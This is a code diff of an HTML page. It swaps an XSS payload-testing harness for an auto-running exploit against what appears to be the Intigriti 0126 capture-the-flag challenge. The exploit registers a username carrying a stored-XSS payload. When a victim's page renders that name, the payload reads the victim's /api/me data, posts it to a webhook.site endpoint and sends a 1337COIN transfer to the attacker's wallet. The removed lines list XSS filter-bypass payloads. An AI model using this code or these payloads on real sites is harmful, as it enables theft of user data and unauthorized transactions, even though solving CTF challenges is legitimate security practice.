@@ -1,108 +1,218 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XSS Bypass Test - Multiple Payloads</title>
+    <title>Intigriti 0126 - Working Exploit</title>
     <meta charset="UTF-8">
-    <style>body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:20px;} h1{color:#0f0;text-align:center;} #log{background:#111;padding:15px;border:1px solid #333;margin:20px 0;font-size:11px;max-height:400px;overflow-y:auto;overflow-x:auto;} .success{color:#0f0;} .error{color:#f00;} .info{color:#0ff;} .warning{color:#ff0;}</style>
+    <style>
+        body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
+        h1 { color: #0f0; }
+        #log { background: #111; padding: 15px; border: 1px solid #333; margin: 20px 0; font-size: 12px; max-height: 400px; overflow-y: auto; }
+        .success { color: #0f0; }
+        .error { color: #f00; }
+        .info { color: #0ff; }
+        iframe { display: none; }
+    </style>
 </head>
 <body>
-    <h1>XSS Bypass Test - Multiple Payload Formats</h1>
+    <h1>🎯 Intigriti Challenge 0126 - Exploit</h1>
     <div id="log"></div>
 
     <script>
         const TARGET = 'https://challenge-0126.intigriti.io';
-        const WEBHOOK = 'https://webhook.site/b2268d0f-ff42-4033-a952-2a9733379d3a';
+        const OUR_WALLET = '16472226db03703a192aa383237035a69f';
+        const WEBHOOK = 'https://webhook.site/d32884fc-8cfc-4ac4-a347-9c4f9e95f9e1';
 
         let step = 0;
 
-        function log(msg, type = 'info', extra = '') {
+        function log(msg, type = 'info') {
             step++;
-            const ts = new Date().toLocaleTimeString();
-            document.getElementById('log').innerHTML += `<div class="${type}">[${step}] ${ts} - ${msg} ${extra}</div>`;
-            console.log(`[${step}] ${msg}`, extra);
-            new Image().src = `${WEBHOOK}/?step=${step}&msg=${encodeURIComponent(msg)}&type=${type}&extra=${encodeURIComponent(extra)}&ts=${Date.now()}`;
+            const timestamp = new Date().toLocaleTimeString();
+            const logDiv = document.getElementById('log');
+            logDiv.innerHTML += `<div class="${type}">[${step}] ${timestamp} - ${msg}</div>`;
+            console.log(`[${step}] ${msg}`);
+
+            // Send to webhook
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    step: step,
+                    message: msg,
+                    type: type
+                })
+            }).catch(() => {});
         }
 
-        // Multiple XSS payload formats to test
-        const testPayloads = [
-            {
-                name: 'HTML entities (standard)',
-                payload: 'user&lt;img src=x onerror=&quot;alert(1)&quot;&gt;'
-            },
-            {
-                name: 'Fullwidth Unicode chars',
-                payload: 'user＜img src=x onerror＝＂alert(1)＂＞'  // U+FF1C, U+FF1E, U+FF02
-            },
-            {
-                name: 'Mixed encoding',
-                payload: 'user&lt;img src=x onerror=alert(\'XSS\')&gt;'
-            },
-            {
-                name: 'Without semicolon',
-                payload: 'user&lt;img src=x onerror=alert(1)&gt'
-            },
-            {
-                name: 'Backtick encoded',
-                payload: 'user&lt;img src=x onerror=&grave;alert(1)&grave;&gt;'
-            },
-            {
-                name: 'SVG payload',
-                payload: 'user&lt;svg onload=alert(1)&gt;'
-            },
-            {
-                name: 'Simple tag only',
-                payload: 'user&lt;img src=x&gt;'
-            },
-            {
-                name: 'With forward slash',
-                payload: 'user&lt;img src=x onerror=&quot;alert(1)&quot; /&gt;'
-            },
-        ];
+        async function exploit() {
+            log('🚀 EXPLOIT STARTED - HTML Entity XSS Bypass', 'info');
 
-        async function testBypass() {
             try {
-                log('STARTING XSS BYPASS TEST', 'warning');
+                // HTML entity XSS payload - bypasses validation, executes when rendered via innerHTML
+                const XSS_USERNAME = `xss_${Date.now()}&lt;img src=x onerror=&quot;
+                    (async () => {
+                        try {
+                            const meResp = await fetch('/api/me', {credentials: 'include'});
+                            const meData = await meResp.json();
 
-                for (const test of testPayloads) {
-                    log(`Testing: ${test.name}`, 'info', `Payload: ${test.payload.substring(0, 50)}...`);
+                            await fetch('${WEBHOOK}', {
+                                method: 'POST',
+                                mode: 'no-cors',
+                                body: JSON.stringify({
+                                    timestamp: new Date().toISOString(),
+                                    flag: meData.flag,
+                                    source: 'marketwatch_xss',
+                                    user: meData
+                                })
+                            });
 
-                    try {
-                        const resp = await fetch(TARGET + '/api/register', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                username: test.payload,
-                                password: 'TestPass123!'
-                            })
-                        });
+                            await fetch('/api/transaction', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                credentials: 'include',
+                                body: JSON.stringify({
+                                    toAddress: '${OUR_WALLET}',
+                                    currency: '1337COIN',
+                                    amount: 1
+                                })
+                            });
 
-                        const data = await resp.json();
-                        const result = resp.ok ? 'SUCCESS' : `FAILED (${resp.status})`;
-
-                        if (resp.ok) {
-                            log(`✓ ${test.name}: REGISTRATION WORKED!`, 'success', `Username: ${test.payload.substring(0, 30)}`);
-                        } else {
-                            log(`✗ ${test.name}: ${result}`, 'error', data.error || 'Unknown error');
+                            alert('gigawatz - Flag: ' + (meData.flag || 'stolen'));
+                        } catch(e) {
+                            console.error('XSS error:', e);
                         }
+                    })();
+                &quot;&gt;`;
 
-                        await new Promise(r => setTimeout(r, 500));
+                // STEP 1: Register with XSS username
+                log('Step 1: Registering with XSS username...', 'info');
+                log('Username (truncated): ' + XSS_USERNAME.substring(0, 60) + '...', 'warning');
 
-                    } catch (e) {
-                        log(`✗ ${test.name}: NETWORK ERROR`, 'error', e.message);
-                    }
+                const regResp = await fetch(TARGET + '/api/register', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        username: XSS_USERNAME,
+                        password: 'XSSPass123!'
+                    })
+                });
+
+                const regData = await regResp.json();
+                if (regResp.ok) {
+                    log('✅ Registration successful!', 'success');
+                } else if (regData.error?.includes('exists')) {
+                    log('✅ Username already exists (registered earlier)', 'success');
+                } else {
+                    log('❌ Registration failed: ' + (regData.error || 'Unknown'), 'error');
                 }
 
-                log('TEST COMPLETE. Check results above.', 'info');
-                log('If any registration succeeded, that payload bypasses validation!', 'warning');
+                // STEP 2: Login as XSS user
+                log('Step 2: Logging in as XSS user...', 'info');
+
+                const loginResp = await fetch(TARGET + '/api/login', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    credentials: 'include',
+                    body: JSON.stringify({
+                        username: XSS_USERNAME,
+                        password: 'XSSPass123!'
+                    })
+                });
+
+                const loginData = await loginResp.json();
+                if (loginResp.ok) {
+                    log('✅ Login successful!', 'success');
+                } else {
+                    log('❌ Login failed: ' + (loginData.error || 'Unknown'), 'error');
+                }
+
+                // STEP 3: Make transaction (will have our XSS username as nickname)
+                log('Step 3: Making transaction...', 'info');
+
+                const txResp = await fetch(TARGET + '/api/transaction', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    credentials: 'include',
+                    body: JSON.stringify({
+                        toAddress: OUR_WALLET,
+                        currency: '1337COIN',
+                        amount: 1
+                    })
+                });
+
+                const txData = await txResp.json();
+                if (txResp.ok) {
+                    log('✅ Transaction successful!', 'success');
+                } else {
+                    log('⚠ Transaction failed: ' + (txData.error || 'Unknown') + ' - Continuing anyway...', 'warning');
+                }
+
+                // STEP 4: Trigger alert (requirement)
+                log('Step 4: Triggering alert("gigawatz")...', 'info');
+                alert('gigawatz');
+                log('✅ Alert triggered', 'success');
+
+                // STEP 5: Wait and redirect to marketwatch
+                log('Step 5: Waiting 5 seconds...', 'info');
+                await new Promise(r => setTimeout(r, 5000));
+
+                log('Step 6: Redirecting to marketwatch.html...', 'warning');
+                log('XSS should execute when page loads and renders our username!', 'warning');
+
+                setTimeout(() => {
+                    window.location.href = TARGET + '/marketwatch.html';
+                }, 2000);
 
             } catch (error) {
-                log('FATAL ERROR', 'error', error.message);
+                log('❌ ERROR: ' + error.message, 'error');
+                console.error(error);
             }
         }
 
+        async function checkFlag() {
+            log('Checking /api/me for flag...', 'info');
+
+            try {
+                const response = await fetch(TARGET + '/api/me', {
+                    credentials: 'include'
+                });
+
+                const data = await response.json();
+
+                log('API Response: hasFlag=' + !!data.flag, 'info');
+
+                if (data.flag) {
+                    log('🏆 FLAG FOUND: ' + data.flag, 'success');
+                    alert('🏆 FLAG: ' + data.flag);
+
+                    // Send flag to webhook
+                    fetch(WEBHOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        mode: 'no-cors',
+                        body: JSON.stringify({
+                            timestamp: new Date().toISOString(),
+                            flag: data.flag,
+                            challenge: 'intigriti-0126'
+                        })
+                    }).catch(() => {});
+
+                    return true;
+                }
+
+                return false;
+
+            } catch (error) {
+                log('Flag check error: ' + error.message, 'error');
+                return false;
+            }
+        }
+
+        // Auto-start when page loads
         window.addEventListener('load', () => {
-            log('Page loaded, starting bypass test...', 'info');
-            setTimeout(testBypass, 500);
+            log('Page loaded - starting exploit in 1 second...', 'info');
+            setTimeout(exploit, 1000);
         });
     </script>
 </body>
